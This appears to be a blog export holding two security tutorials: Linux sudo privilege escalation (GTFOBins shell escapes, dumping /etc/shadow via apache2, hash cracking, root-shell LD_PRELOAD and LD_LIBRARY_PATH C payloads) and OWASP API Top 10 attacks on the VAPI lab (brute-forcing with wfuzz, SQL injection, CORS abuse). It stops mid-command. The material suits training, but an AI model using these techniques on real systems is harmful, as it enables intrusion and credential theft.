[{"categories":null,"contents":"Sudo is a powerful command in Linux that allows users to run commands with elevated privileges. When properly configured, sudo can help ensure system security by enabling users to perform only authorised tasks and preventing unauthorised changes to system files. However, if not configured correctly, sudo can be exploited to escalate privileges and gain access to sensitive system files. In this article, we\u0026rsquo;ll take a deep dive into sudo and explore some common privilege escalation techniques that attackers can use to exploit sudo.\nKey points. Sudo is a program that allows users to run other programs with security privileges, even with other users. A user generally has to enter the password of their own user account in order to run a command using sudo. The user must be granted access in the /etc/sudoers file. Permissions can vary; for example, users can be limited to running only certain programs, or they can be allowed to run commands without entering a password. To get your hands on a keyboard, you can either use this lab https://github.com/sagishahar/lpeworkshop or this https://tryhackme.com/room/linuxprivesc\nHere are some different methods of privilege escalation using sudo.\nMethod 1. Known Password. If a user is permitted to run sudo for every command (unrestricted) and has the user\u0026rsquo;s password, privilege escalation is easy - they can simply run sudo su and provide the password. Example. If the user does not have permission to run every program, including su, then the technique mentioned earlier won\u0026rsquo;t work. Example If su is not allowed, there are other ways to escalate privileges using sudo. Some examples include:\nsudo /bin/bash sudo passwd sudo -i sudo -s To learn more about sudo, you can run man sudo on a Linux machine. If the above techniques fail, check the next step.\nMethod 2. Shell Escape Sequences. In Linux, shell escape sequences are sequences of characters that are recognised by the shell (such as bash) and are used to perform various actions, including executing commands or running programs.\nShell escape sequences can be used to bypass restrictions or to perform actions that are not typically allowed within the current context of the shell. For example, if a user is not authorised to run a particular command, they might be able to use a shell escape sequence to execute the command anyway.\nIf certain programs are not allowed to be run via sudo, it is still possible to escape the program and spawn a shell. To achieve this, follow the steps below:\nRun sudo -l to list all the programs a user can run via sudo. From the output, check each program in the list to see if there is a shell escape sequence on GTFOBins. If an escape sequence exists, follow the given instructions to spawn a shell. Let\u0026rsquo;s see how this works using our lab.\nStep 1. Run sudo -l to see the results. From the above results, we can see that a user may run different programs on this host, such as iftop, find, nano, vim, man, awk, less, ftp, nmap, apache2, and more via sudo Step 2. Let\u0026rsquo;s see which commands have escape sequences on the GTFOBins website.\nIn this blog, I am going to use the less program, but you can try to see if other programs have escape sequences as well.\nTo check if there is an escape sequence for the less program, go to the GTFOBins website and search for less in the search box. The results show that we do have an escape sequence for our program Step 3. To proceed, click on the \u0026ldquo;Sudo\u0026rdquo; option (the first option on the right). As we can see, here is our escape sequence to get a shell for less program. sudo less /etc/profile ! /bin/sh or sudo less /etc/profile ! /bin/bash Step 4. Let\u0026rsquo;s go back to our lab and run the command sudo less /etc/profile After running the above command. Insert ! /bin/bash and press enter. As you can see from the above output, we have successfully escalated our privileges. Take some time to go through the other programs we found earlier and try to escalate privileges. If a program does not have an escape sequence, we can still try to use it to escalate our privileges using the below explained methods.\nMethod 3. Abusing Intended Functionality As the name suggests, we are abusing the intended functionality to escalate our privileges. We only resort to this method after finding out that a program that can be run via sudo has no escape sequence.\nIf we can read or write files owned by root, we may be able to retrieve information such as passwords and hashes that will help us access root privileges, or insert/modify information in that file. Step 1. Run this command (sudo -l) We tried to find escape sequences for the programs on the list we generated on the GTFOBins website. We were successful in finding escape sequences for the majority of them, except for apache2. Apache2 has no known escape sequence.\nStep 2. Let\u0026rsquo;s use apache2 as it is intended, if you run man apache2 the interesting option is -f Step 3. Running the apache2 command with -f option when parsing a config file it will error and print any line it doesn\u0026rsquo;t understand.\nExample Run sudo apache2 -f /etc/passwd We can see from the output, the command returned error but with some results in the /etc/passwd file. To understand this more, try different config files and see the results returned. Step 4 Since passwords are stored in /etc/shadow, let\u0026rsquo;s try to use apache2 on this file. sudo apache2 -f /etc/shadow As expected, the command threw synstax error on line 1 of /etc/shadow and printed back the line which in this case it is a password hash. Save the password hash to the file (eg. passwd.txt) Step 5. Use your favourite tool to crack the hash using a wordlist. Example John the Ripper. john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyour.txt password.txt From the output, the password is password123 Step 6 Switch to root.\nUse the password from the above step to switch user su to root. From the above results, we have successfully escalate out privileges. Method 4 Environment Variables Environment variables are variables that are set in the operating system\u0026rsquo;s environment and are accessible to all programs and hold system information that can guide their behaviour. Example $PATH, $HOME, $USER.\nPrograms that run through sudo can inherit the user\u0026rsquo;s environment variables. The most common environment variable that can be exploited to escalate privileges are\nLD_PRELOAD LD_LIBRARY_PATH The above environment variables can only help us escalate privileges when the env_keep option is set in the /etc/sudoers configuration file to either of the above environment variables. env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH\nTo see if the env_keep option is set to the environment variables mentioned above, use sudo -l. Alternatively, if you have sudo password, you can run sudo cat /etc/sudoers.\nFrom our lab, the above output shows that the env_keep option is set to LD_PRELOAD and LD_LIBRARY_PATH. LD_PRELOAD. LD_PRELOAD is an environmental variable in Linux that allows users to specify one or more shared libraries to preload before any other shared library. By setting the LD_PRELOAD variable, users can override specific functions in a program, without modifying the original program\u0026rsquo;s source code or binary. LD_PRELOAD is commonly used for debugging, profiling, or adding new functionality to existing programs.\nTo use this environment variable to escalate our privileges, the real user ID must be the same as the effective user ID.\nStep 1. Create a function using c programming language that will spawn a shell with root privileges when run.\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; void _init(){ unsetenv(\u0026#34;LD_PRELOAD\u0026#34;); setgid(0); setuid(0); system(\u0026#34;/bin/sh\u0026#34;); } You can change /bin/sh to /bin/bash.\nSave the above file with .c extension step 2. Compile the code with this command gcc -fPIC -shared -nostartfiles -o shell.so shell.c Step 3. Run sudo LD_PRELOAD=/path/filename.so {any allowed program using sudo}\n/path/filename.so Specify the path were the .so file is. {allowed program using sudo} Run sudo -l to see programs that can be run via sudo In our lab let\u0026rsquo;s use less program.\nsudo LD_PRELOAD=/tmp/shell.so less From the above results, we have escalated our privileges using less program. Step 4. Since all other commands that can run via sudo in our lab has escape sequences except apache2, let\u0026rsquo;s exploit apache2 using the above method of escalating privileges using LD_PRELOAD.\nRun sudo LD_PRELOAD=/tmp/shell.so apache2 From the above output, we have successfully escalated our privileges to root. This method comes in handy when the program has no escape sequence. LD_LIBRARY_PATH LD_LIBRARY_PATH is an environmental variable in Linux that specifies a list of directories where the system should look for shared libraries when a program is run. The shared libraries are typically files that contain code used by multiple programs on the system. By default, the system searches for shared libraries in a set of standard directories, but users can use the LD_LIBRARY_PATH variable to add additional directories to the search path.\nTo list shared libraries used by a program, use the command ldd with the path of the program\nStep 1. List all programs that can be run via sudo (sudo -l) Sep 2. Choose a program that you want to use. Example on my side I will use less List libraries of the command you chose. e.g ldd /usr/bin/less The results above show the libraries for less program. Step 3. Choose the library to hijack from the list libraries in the above step. You can choose any library. Example let\u0026rsquo;s choose libdl.so.2 Step 4. Create a function using c programming language that will hijack our program to spawn a shell. #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; static void shell() __attribute__((constructor)); void shell(){ unsetenv(\u0026#34;LD_LIBRARY_PATH\u0026#34;); setgid(0); setuid(0); systme(\u0026#34;/bin/bash\u0026#34;); } Save file with .c extension with the above contents. I saved my file as shell.c Step 5. Compile the above file into the name of the library we chose in step 3 which is libdl.so.2 by running the following command gcc -fPIC -shared -o libdl.so.2 shell.c (change shell.c to the name of your file, and libdl.so.2 to the name of your selected library) Step 6. Run the program you chose on step 2 via sudo while setting LP_LIBRARY_PATH environment variable to the path where we compiled our .c file. On my lab sudo LD_LIBRARY_PATH=/home/user less From the above output, we have successfully escalated our privileges. In conclusion, there are several ways to escalate privileges using the sudo command, which can potentially expose your system to security risks. It is important to be aware of these techniques and take steps to mitigate them.\n","date":"May 15, 2023","hero":"/posts/privilege-escalation/linux/sudo-exploitation/hero.jpg","permalink":"http://localhost:1313/posts/privilege-escalation/linux/sudo-exploitation/","summary":"Sudo is a powerful command in Linux that allows users to run commands with elevated privileges. When properly configured, sudo can help ensure system security by enabling users to perform only authorised tasks and preventing unauthorised changes to system files. However, if not configured correctly, sudo can be exploited to escalate privileges and gain access to sensitive system files. In this article, we\u0026rsquo;ll take a deep dive into sudo and explore some common privilege escalation techniques that attackers can use to exploit sudo.","tags":null,"title":"Escalating Privileges with Sudo"},{"categories":null,"contents":"According to a Gartner report in 2020 APIs account for 90% of the attack surface and are the most frequent attack vector.\nAPIs often handle sensitive data, such as personal information, financial data, and intellectual property. If an API is not properly secured, this data can be easily accessed and stolen by hackers. In fact, some of the recent big data breaches have been due to under-protected APIs.\nIn this blog post, I am going to discuss OWASP top 10 API 2019 vulnerabilities by using VAPI. VAPI (Vulnerable Adversely Programmed Interface) refers to a PHP interface that can be hosted by the user. It is designed to provide exercises based on scenarios from OWASP API Top 10 2019, aimed at simulating real-world situations.\nWe are going to use the following tools in this blog post:\nPostman Burp Suite Wfuzz Install VAPI from GitHub or use the one that is hosted at http://vapi.apisec.ai/vapi. Import the VAPI collection into your postman. Also, this post assumes that you have a basic understanding of how to use Postman, Burp Suite, and the Linux operating system. Set Postman to proxy so that you can intercept requests in Burp Suite.\nAPI1: 2019 Broken Object Level Authorization This vulnerability occurs when APIs fail to enforce appropriate access controls for individual objects, resulting in unauthorized access and data leaks. This attack is also referred to as IDOR (Insecure Direct Object References) in regular web applications. In other words, a user can access other users\u0026rsquo; information simply by providing their IDs.\nHow to exploit Let\u0026rsquo;s explore this vulnerability practically using VAPI\nStep 1. VAPI collection in Postman, Create an account. Fig 1:1: POST request to vapi/api/user Step 2. Retrieve the details of the account that we created by using its ID.(Fig 1:2)\nProvide the Authorization Token. Which is the base64 encode of \u0026quot;Username:Password\u0026quot;.\n# if you are using Linux use this command # echo -n \u0026#34;Username:Password\u0026#34; | base64 echo -n \u0026#34;Hello7070:hellow70\u0026#34; | base64 Fig 1:2: GET request to vapi/api/user\nStep 3. To check if you have access to view other users\u0026rsquo; details, you can change the ID to different id. For example, let\u0026rsquo;s use ID = 1.(Fig 1:3) Fig 1:3: GET request to vapi/api/user/1\nAs you can see from the example above, by providing the ID of 1, we were able to view all the details of that account. Broken Object-Level Authorisation (BOLA) occurs when a user is authenticated, but there is no authorisation mechanism in place to verify whether the user has the necessary permissions to access the requested resources.\nHow to Prevent To ensure secure access control, implement a proper authorisation mechanism, use it to check access, prefer GUIDs as IDs, and test and validate changes before deployment.\nFor more about this vulnerability, check out API1:2019 Broken Object Level Authorization\nAPI2:2019 Broken User Authentication API authentication can be a complex system that includes several processes with a lot of room for failure. A security expert Bruce Schneier said, “The future of digital systems is complexity, and complexity is the worst enemy of security.”\nBroken user authentication refers to any weakness within the API authentication process. The weakness may either be lack of protection mechanism in authentication or implementation of the mechanism.\nHow to exploit Let\u0026rsquo;s explore more about this vulnerability using VAPI.\nFig 2:1 login request.\nFrom the above figure (Fig 2:1) we are presented with login credentials which are Email and Password.\nStep 1. Prepare wordlists for our brute force attack.\nThe wordlist we are going to use is available at credentials. Please save the creds.csv file to your directory. We will be using wfuzz for brute forcing. Let\u0026rsquo;s break the list into two parts: the email list and password list. Use cut command, specify the delimiter and field to extract emails and passwords from creds.csv file.\nTo extract the emails, use the command cut -d ',' -f 1 creds.csv \u0026gt; emails.txt.\nTo extract passwords, use the command cut -d ',' -f 2 creds.csv \u0026gt; password.txt.\nStep 2. It\u0026rsquo;s time to start the brute force attack. There are different ways to achieve this; some may want to use the Intruder of Burp Suite or OWASP ZAP Fuzz, but I will be using wfuzz, a pre-installed fuzzing tool in Kali Linux.\nThe command is for wfuzz is\nwfuzz -d \u0026#39;{\u0026#34;email\u0026#34;:\u0026#34;FUZZ\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;FUZ2Z\u0026#34;}\u0026#39; -H \u0026#39;Content-Type: application/json\u0026#39; -z file,emails.txt -z file,passwords.txt -u http://127.0.0.1/vapi/api2/user/login -m zip --hc 401 Explanation of the command.\nwfuzz: This is the name of the tool being used.\n-d '{\u0026quot;email\u0026quot;:\u0026quot;FUZZ\u0026quot;,\u0026quot;password\u0026quot;:\u0026quot;FUZ2Z\u0026quot;}': This option specifies the data to be sent in the HTTP POST request. The value \u0026ldquo;FUZZ\u0026rdquo; will be replaced by the emails wordlist to be tested, and The value \u0026ldquo;FUZ2Z\u0026rdquo; will be replaced by the password wordlist to be tested\n-H 'Content-Type: application/json': This sets the HTTP header \u0026ldquo;Content-Type\u0026rdquo; to \u0026ldquo;application/json\u0026rdquo;, indicating that the data being sent is in JSON format.\n-z file,emails.txt: This option specifies that the tool should use a wordlist (in the file \u0026ldquo;emails.txt\u0026rdquo;) for the \u0026ldquo;email\u0026rdquo; parameter in the data. The \u0026ldquo;FUZZ\u0026rdquo; value in the data will be replaced by each value in the email wordlist.\n-z file,passwords.txt: This option specifies that the tool should use another wordlist (in the file \u0026ldquo;password.txt\u0026rdquo;) for the \u0026ldquo;password\u0026rdquo; parameter in the data. The \u0026ldquo;FUZ2Z\u0026rdquo; value in the data will be replaced by each value in the password wordlist.\n-u http://127.0.0.1/vapi/api2/user/login: This is the target URL for the login page. change this to your target\n-m zip: combining payloads\n-hc 401: Hides responses with HTTP status code of 401\nFig 2:2 wfuzz output.\nStep 3. Use the credentials we got from step 2 to login. Fig 2:3 POST vapi/api2/user/login$\nStep 4. Use the token from step 3, into Authorization-Token for GET request to get details.(Fig 2:4)\nFig (2:4) GET request vapi/api2/user/details\nFrom the above step, we are able to exploit broken user authentication and accessed user\u0026rsquo;s private info.\nHow to Prevent To ensure secure authentication, utilise established standards for authentication, token generation, and password storage, and treat credential recovery/forget password endpoints like login endpoints with anti-brute force mechanisms that are stricter than regular rate limiting.\nLearn more about this vulnerability at API2:2019 Broken User Authentication\nAPI3:2019 Excessive Data Exposure This can occur when an API endpoint responds with more information than is needed to fulfill a request, expecting the consumer to filter the results. This can be the equivalent of asking someone for their name and having them respond with their name, date of birth, email address, phone number, and the identification of every other person they know. This vulnerability can lead to data breaches, loss of trust, and financial loss.\nLet\u0026rsquo;s explain this vulnerability using VAPI Step 1. In the Vapi resources, there is an APK. Copy it and install it in the Android emulator. Set your Android emulator\u0026rsquo;s proxy settings to 127.0.0.1:8080 so that you can use Burp to intercept the requests Step 2. Open the application and input the base URL. While adding the base URL in the APK, add it like this:\nbaseurl/vapi If your base url is http://127.0.0.1 Add it like http://127.0.0.1/vapi If you are using the Android emulator, and you are running Vapi locally, the base URL is http://your machine IP address. For example, if the IP address of the machine where both the Android emulator and Vapi run locally is 192.168.1.22,then the baseurl is http://192.168.1.22/vapi For example, this is my emulator, and I can access the Vapi lab using my IP address. This is the screenshot of baseURL/vapi.\nStep 3. Create an account.\nIntercept request and response in burp From the above results, account is created, and our our \u0026ldquo;ID\u0026rdquo; is 3 Step 4. After signing up, log in to the app.\nLet\u0026rsquo;s see the login using postman After logging into the app, this is the screen we are presented with. In the above screen, create a new comment Step 5. After signing in, we automatically get this request GET /vapi/api3/comment. From the above response:\nThe data we received back is more than what we were supposed to get. We asked for a comment, but instead, we got back the device ID, latitude, and longitude of the user who wrote the comment. The above scenario happened because the developer didn\u0026rsquo;t filter sensitive data and relied on the client. How to Prevent. To prevent excessive data exposure through APIs, avoid relying on client-side filtering, review API responses, consider the consumer before exposing new endpoints, cherry-pick specific properties, classify sensitive information, and implement schema-based response validation.\nLearn more about this vulnerability at API3:2019 Excessive Data Exposure\nAPI4:2019 Lack of Resources \u0026amp; Rate Limiting A lack of resources and rate limiting are two related concepts that are commonly encountered in the context of application programming interfaces (APIs).\nA lack of resources refers to a situation where an API or the underlying infrastructure is unable to handle all of the requests that are being made to it due to insufficient resources, such as processing power, memory, or bandwidth. This can lead to slower response times, dropped requests, or even system crashes. An attack may send an many requests to the api end-point and cause the DoS (Denial of service attack)\nRate limiting, on the other hand, is a mechanism used by APIs to restrict the number of requests that can be made within a given time period, usually to prevent overloading the system or to prevent abuse like bruteforcing. The API provider will typically define a set of rules that govern how many requests can be made within a given time frame (e.g., 5 requests per minute), and any requests that exceed this limit will be rejected or delayed. If rate limiting is not set especially to end-points that involves authentications, the attacker may bruteforce login or password reset functionality and gain access.\nLets see how to exploit this vulnerability using VAPI - API4 Step 1. Open API4 in VAPI collection We have three requests: \u0026ldquo;POST Mobile Login\u0026rdquo;, \u0026ldquo;POST Verify OTP\u0026rdquo;, and \u0026ldquo;GET Get Details.\u0026rdquo; Step 2. On the first request (\u0026ldquo;POST Mobile Login\u0026rdquo;), send a request. As we can see, the request was successful. The response shows that we have to provide a 4-digit OTP sent to the mobile number: \u0026quot;msg\u0026quot;: \u0026quot;4 Digit OTP sent on mobile no.\u0026quot; Step 3. On the second request (\u0026quot;POST\u0026quot; Verify OTP). Send request on postman through burp suite. A 403 Forbidden response was returned, meaning the OTP provided is invalid. There is no rate limiting on the response. Step 4. Since there is no rate limiting, it\u0026rsquo;s time to brute-force the OTP. The OTP is four digits (from the request \u0026ldquo;otp\u0026rdquo;:\u0026ldquo;9999\u0026rdquo;), meaning the OTP will be between 0000 and 9999.\nLet\u0026rsquo;s create a wordlist of numbers containing all numbers from 0000-9999 using python. numbers = list(range(0000,10000)) with open(\u0026#39;numbers.txt\u0026#39;, \u0026#39;w\u0026#39;) as f: for num in numbers: f.write(str(num) + \u0026#39;\\n\u0026#39;) After having a wordlist, we will use wfuzz to brute-force the OTP. (There are a variety of different other tools for brute-forcing like ffuf and Intruder). The reason we are using wfuzz and not Burp Intruder is that wfuzz is faster than Intruder in Burp community edition. The wfuzz command is\nwfuzz -d \u0026#39;{\u0026#34;otp\u0026#34;:\u0026#34;FUZZ\u0026#34;}\u0026#39; -H \u0026#39;Content-Type:application/json\u0026#39; -z file,numbers.txt -u http://127.0.0.1/vapi/api4/otp/verify --hc 403 In the above command, please change numbers.txt to the name of your wordlist, unless you used the above python script. change the URL (http://127.0.0.1) to yours. From the above result\nThe OTP is 1872 Step 5. In repeater Burp Suite or Postman, on the \u0026ldquo;POST Verify OTP\u0026rdquo; request, provide the OTP we got from the above step and send the request. We got 200 OK responce and, We got the key. Step 5. On the third request (\u0026quot;GET\u0026quot; Get Details), In postman, put the key from above step to Authorization-Token ({{api4_key}}) After providing the key value of Authorization-Token, send the request. We can see the postman responce below. The 200 Ok responce was returned We are able to login as John despite not having john mobile number. And we have the flag. The responce in Burp suite. we have successfully exploited this vulnerability. How to Prevent. To prevent lack of resources and rate limiting in APIs, measures such as limiting resource usage, implementing rate limiting, adding server-side validation, and defining maximum data size can be taken\nFor more about this vulnerability, check out API4:2019 Lack of Resources \u0026amp; Rate Limiting\nAPI5:2019 Broken Function Level Authorization Exploitation involves an attacker sending valid API calls to endpoints they should not have access to, which can be discovered more easily in APIs due to their structured nature. Authorisation checks for functions or resources are often managed through configuration and can be complex to implement properly. These flaws can give attackers access to unauthorised functions, with administrative functions being a common target.\nSome common flaws that can lead to unauthorised access include:\nPredictable resource locations: If resource locations are predictable or easily guessable, it may be possible for an attacker to access resources that they are not authorised to access.\nInsufficient access controls: If access controls are not properly implemented, it may be possible for an attacker to bypass them and gain access to restricted resources.\nHow to exploit. Step 1.\nIn the Postman API collection, expand API 5. Create an account using POST /vapi/api5/user. Here\u0026rsquo;s a screenshot of the Postman showing the account creation and response: Step 2. Send a login request using GET /vapi/api5/user/id. Put the username and password in the login body. Use the ID from the account creation response and put it in the ID placeholder in the request GET /vapi/api5/user/2. Put the Authorization-Token in the {api5_key} value. The token is the base64 encode of username:password. Change the username and password details to the details you used to create the account. You can use an online application to base64 encode the login credentials, or you can use the Linux command echo -n \u0026quot;username:password\u0026quot; | base64. Copy the token above and put it in the Authorization-Token value field, then send the request. As we can see from the above,\nWe can see that we have our account details. We are authenticated, and to access our data, we have to provide the username and password. Let\u0026rsquo;s test the authorization functions.\nStep 3. Since the above request is GET /vapi/api5/user/id, let\u0026rsquo;s try sending API requests to different endpoints. We can test GET /vapi/api5/user/admin, GET /vapi/api5/user/admins, GET /vapi/api5/admin, GET /vapi/api5/users, and so on, depending on the generic naming convention of other previous endpoints.\nWe can see that in the endpoint GET /vapi/api5/users, we get the following response in:-\nPostman Burp From the responses above, we can see that we are able to see privileged information, which are admin info. For more information about BAFLA, watch SANS Offensive Operations YouTube video titled \u0026ldquo;Analyzing The OWASP API Security Top 10 For Pen Testers\u0026rdquo;). How to Prevent To secure an application, enforce denial of all access by default, review API endpoints for authorisation flaws, and implement authorisation checks based on user group/role. Administrative controllers should inherit from an administrative abstract controller, and administrative functions in regular controllers should also implement authorisation checks based on user group/role.\nLearn more about this vulnerability at API5:2019 Broken Function Level Authorization\nAPI6:2019 Mass Assignment Mass Assignment occurs when an API consumer includes more parameters in their requests than the application intended and the application adds these parameters to code variables or internal objects. Understanding the business logic, objects\u0026rsquo; relations, and the API structure is typically necessary for exploitation. APIs make it easier to exploit mass assignment because they expose the application\u0026rsquo;s underlying implementation and the names of its properties.\nTo streamline development, modern frameworks often provide functions that automatically connect input from clients to code variables and internal objects. Unfortunately, attackers can take advantage of this approach to alter or replace properties of sensitive objects that developers never meant to reveal.\nLet\u0026rsquo;s explore this vulnerability using VAPI. Step 1. On Postman VAPI collection, expand API6. There are two requests, POST Create User and GET user On the first request, POST Create User, create a user by filling the information required. Postman request and response. Burp\u0026rsquo;s request and response Step 2. On Second request, GET Get User, Provide the Authorization-Token. Again, this token is the value of base64 encode of username:password. You can use linux command echo -n \u0026quot;username:password\u0026quot; |base64 Change the username and password above to the one you used to create an account in the first step. Put the token into the Authorization-Token value field and send the request. Postman request and response. Burp suite request and response. From the above responses, both Postman\u0026rsquo;s and Burp Suite\u0026rsquo;s, we can see that there is an additional field which is \u0026quot;credit\u0026quot;:\u0026quot;0\u0026quot;. Step 3. Let\u0026rsquo;s try to create a new account but this time, set the \u0026quot;credit\u0026quot; to any number.\nLet\u0026rsquo;s set the credit to 20.\nThe request and response on postman The request and response in Burp suite From the above,\nWe got the 200 response, meaning the request was successful The id is 4 Step 4. Let\u0026rsquo;s request the details of our new account. Remember to base64 encode the \u0026ldquo;username:password\u0026rdquo; and use it as the Authorization-Token. As we can see, the credit is set to the number that we set while creating an account in the above step.\nStep 5. Let\u0026rsquo;s create a new account, and this time set the credit to 200.\nIn Postman In Burp Suite After creating the account, encode \u0026ldquo;username:password\u0026rdquo; (the new username and password) using base64 and set it as the Authorization-Token. Request and response in postman Request and response in Burp suite From the above output, we have successfully exploited this vulnerability. We have set our credit to 200. How to Prevent this vulnerability according to OWASP. If possible, avoid using functions that automatically bind a client’s input into code variables or internal objects. Whitelist only the properties that should be updated by the client. Use built-in features to blacklist properties that should not be accessed by clients. If applicable, explicitly define and enforce schemas for the input data payloads For more information about this vulnerability, check out API6:2019 Mass Assignment\nAPI7:2019 Security Misconfiguration API security misconfigurations can occur at any level, leaving the system vulnerable to unauthorised access or exposure of sensitive data. Attackers will often search for unpatched flaws, unprotected files and directories, or common endpoints to exploit these misconfigurations. These vulnerabilities can be present at the network or application level and can be detected and exploited using automated tools. If left unaddressed, security misconfigurations can lead to serious consequences such as unauthorised access to sensitive user data or full server compromise.\nAccording to OWASP, the API might be vulnerable to security misconfiguration if:\nAppropriate security hardening is missing across any part of the application stack, or if it has improperly configured permissions on cloud services. The latest security patches are missing, or the systems are out of date. Unnecessary features are enabled (e.g., HTTP verbs). Transport Layer Security (TLS) is missing. A Cross-Origin Resource Sharing (CORS) policy is missing or improperly set. Error messages include stack traces, or other sensitive information is exposed. Exploring this vulnerability using VAPI. Step 1. This lab has improperly CORS set. Cross-Origin Resource Sharing (CORS) is a security mechanism implemented in web browsers that allows a server to specify which origins are permitted to access its resources. This is done to prevent malicious scripts on unauthorised domains from accessing sensitive data or performing unauthorised actions on behalf of a user. CORS is enforced by the browser and is based on HTTP headers exchanged between the client and server. In summary, CORS ensures that web applications are accessed only from trusted sources and reduces the risk of unauthorised access and data leakage.\nLet\u0026rsquo;s see this in VAPI collection API7. We see there are four requests which are POST: Create User, GET Login, GET Key, User Logout\nOn the first request, create a new account. Step 2. On the second request (GET Login), login using the created credentials above. Again, the Authorization-Token value is encoded as \u0026ldquo;username:password\u0026rdquo; using base64. We are now logged in. Step 3. On the third request (GET Key), since we are logged in, send the request.\nRequest and response in Burp suite Request and response in Postman From the above response,\nThere are two most important pieces of information: Access-Control Allow-Origin * and Access-Control Allow-Credentials: true. Step 4. On the request, let\u0026rsquo;s add Origin: and put a domain that we control. For this lab use any domain. Let\u0026rsquo;s use hellow.com Origin: hellow.com and send the request. From above response, our site hellow.com is accepted Acess-Control Allow-Origin: hellow.com We have the flag as well. We have successfully exploited the security misconfiguration of this site. How to Prevent According to OWASP, use the following techniques to prevent this vulnerability from happening.\nA repeatable hardening process leading to fast and easy deployment of a properly locked down environment. A task to review and update configurations across the entire API stack. The review should include: orchestration files, API components, and cloud services (e.g., S3 bucket permissions). A secure communication channel for all API interactions access to static assets (e.g., images). An automated process to continuously assess the effectiveness of the configuration and settings in all environments. More about security misconfigurations, check out API7:2019 Security Misconfiguration\nAPI8:2019 Injection API injection attacks occur when attackers exploit vulnerabilities in an API by feeding it with malicious data through various injection vectors such as direct input, parameters, or integrated services. The malicious data is then sent to an interpreter, which processes the input and executes the corresponding operation. However, if the API is not properly secured, the interpreter may misinterpret the input and execute unintended commands. Injection flaws are prevalent in various technologies, including SQL, LDAP, or NoSQL queries, OS commands, XML parsers, and ORM. Such flaws can lead to severe consequences such as information disclosure, data loss, denial of service (DoS), or even complete host takeover.\nExploring the Practical Implications of this Vulnerability Step 1. On VAPI collection in Postman, try logging in using any credentials and check the error message. For example, let\u0026rsquo;s use \u0026lsquo;admin\u0026rsquo; and \u0026lsquo;password\u0026rsquo; as the username and password.\nIn Postman in burp From the above response, the credentials are incorrect. Step 2. Since it accepts input for login, let\u0026rsquo;s try to check if the sign-in is vulnerable to SQL injection.\nPut the single quote (apostrophe ') in the login field. This is because the SQL command uses a single quote to enclose the string literals or character data.\nExample.\nSELECT * FROM users WHERE username = \u0026#39;username\u0026#39; AND password = \u0026#39;password\u0026#39;; When we put a single quote in either the username field or password field, if the page is not vulnerable, it should handle it like any other character. But if the page is vulnerable, it will try to enclose the syntax and then throw an error.\nLet\u0026rsquo;s try this on both the username and password fields in Postman and Burp Suite.\nTrying apostrophe (')on the username field.\nResult in burp Results in postman. From the above results, we can conclude that the username field is vulnerable to SQL injection since it threw an error.\nStep 3. Let\u0026rsquo;s try to use the above methodology to see if the password field is vulnerable to SQL injection by inserting an apostrophe.\nResult in burp Results in postman. From the above results, we can conclude that the password field is also vulnerable to SQL injection. Step 4. Time to exploit the vulnerability.\nSince this is a SQL vulnerability, from the example command above:\nSELECT * FROM users WHERE username = \u0026#39;username\u0026#39; AND password = \u0026#39;password\u0026#39;; Let\u0026rsquo;s try to make the condition true using ' OR 1=1 #\nThe single quote ' encloses the string literals. Then OR is a logical operator that is used to combine multiple conditions in the WHERE clause. This means that the syntax will be true if one of the conditions is true. 1=1 is the second condition, which is true. And because it is true, the command syntax will be true. # the hash symbol is used for commenting out the rest of the syntax of the command in MySQL databases. Try different commenting symbols like -- to understand more about SQL. If you are new to SQL injection, I would advise you to take a few minutes to get to know about SQL injection. Some great resources are Portswigger Academy, Raha Khalil\u0026rsquo;s YouTube channel, and Tib3rius\u0026rsquo;s YouTube channel.\nLet\u0026rsquo;s see the result in Burp by providing ' OR 1=1 # to the username field. We have successfully obtained the authkey. Let\u0026rsquo;s provide the same payload into the password field. Again, we have successfully obtained the authkey. Step 5. In the GET Secret request of Postman\u0026rsquo;s VAPI collection, provide the authkey obtained from the previous step in the Authorization-Token field and send the request.\nResults in postman Results in Burp suite. As you can see, we have successfully solve the lab and logged in as admin. We have successfully exploited injection vulnerability. Best Practices for Preventing API Injection Attacks. To prevent API injection attacks, it is important to perform data validation using a trustworthy library, validate and sanitize all client-provided data, escape special characters, use a parameterized interface, limit returned records, filter incoming data, and define data types and strict patterns for string parameters.\nFor more about this vulnerability, check API8:2019 Injection\nAPI9:2019 Improper Assets Management This vulnerability happens when Old API versions are unpatched and all other vulnerabilities that are patched in new versions still exists in old ones and both versions are connected to the same databases. Example two versions connected on same database, in version 2 there is rate limiting in place but version one there isn\u0026rsquo;t. An attack can bruteforce version 1 and get into the system since there is no rate limiting to prevent bruteforce from happening.\nAttackers may gain access to sensitive data, or even takeover the server through old, unpatched API versions connected to the same database.\nLet\u0026rsquo;s see the exploitation of this vulnerability practically using VAPI. Step 1. From the VAPI collection in Postman, there is a login request where we have the username called \u0026ldquo;richardbranson\u0026rdquo; and a PIN that was sent to the user\u0026rsquo;s phone number. Let\u0026rsquo;s try putting any four digits to see the response. Let\u0026rsquo;s try 1234. From the above result, there are two interesting pieces of information which are \u0026ldquo;X-RateLimit-Limit: 5\u0026rdquo; and \u0026ldquo;X-RateLimit-Remaining: 4\u0026rdquo;. This means that there is rate limiting in place and if we try to brute force and exceed five times, we won\u0026rsquo;t be able to reach the server. We can see the above explanation in the following results in Burp. The above result shows that we have X-RateLimit-Remaining: 1 After exceeding the rate limit, we get a 500 status code. Step 2. The above request on POST /vapi/api9/v2/user/login is protected against brute forcing. But because the request has v2 in it, we can assume that it represents version 2. Let\u0026rsquo;s see version 1 at POST /vapi/api9/v1/user/login From the output above, not only does this request return a 200 status code, but in the response it has no rate limiting in place. This is because the developer abandoned the v1 API once the v2 was in place. Step 3. Since there is no rate limiting in place, lets try to get the PIN that was sent to the user\u0026rsquo;s phone number.\nAgain, we are using wfuzz because it\u0026rsquo;s free and faster compared to Burp Intruder in the community edition. Also, it comes pre-installed in Kali Linux. We are using the same wordlist we created in \u0026ldquo;API4:2019 Lack of Resources \u0026amp; Rate Limiting\u0026rdquo; section. The command for wfuzz is wfuzz -d \u0026#39;{\u0026#34;username\u0026#34;:\u0026#34;richardbranson\u0026#34;, \u0026#34;pin\u0026#34;:\u0026#34;FUZZ\u0026#34;}\u0026#39; -H \u0026#39;Content-Type:application/json\u0026#39; -z file,numbers.txt -u 